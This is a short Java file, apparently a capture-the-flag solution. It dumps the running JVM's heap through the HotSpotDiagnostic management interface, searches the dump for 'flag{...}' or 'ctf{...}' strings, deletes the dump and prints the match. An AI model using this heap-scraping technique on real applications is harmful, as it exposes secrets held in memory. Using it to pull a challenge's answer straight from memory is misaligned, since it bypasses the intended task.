import javax.management.MBeanServer;
import javax.management.ObjectName;
import java.io.File;
import java.lang.management.ManagementFactory;
import java.nio.file.*;
import java.util.regex.*;

public class Solution {
    public static String readFlagViaHeapDump() throws Exception {
        String dump = "./dump.hprof";
        MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
        mbs.invoke(
                new ObjectName("com.sun.management:type=HotSpotDiagnostic"),
                "dumpHeap",
                new Object[]{ dump, Boolean.TRUE },
                new String[]{ "java.lang.String", "boolean" }
        );

        byte[] bytes = Files.readAllBytes(Path.of(dump));
        String haystack = new String(bytes, java.nio.charset.StandardCharsets.ISO_8859_1);

        Pattern p = Pattern.compile("(?:flag|ctf)\\{[^\\}\\r\\n]*\\}", Pattern.CASE_INSENSITIVE);
        Matcher m = p.matcher(haystack);
        String found = m.find() ? m.group() : null;

        try { Files.deleteIfExists(Path.of(dump)); } catch (Throwable ignore) {}

        return found;
    }

    public static void solve(Object obj) throws Exception {
        String flag = readFlagViaHeapDump();
        System.out.println(flag);
    }
}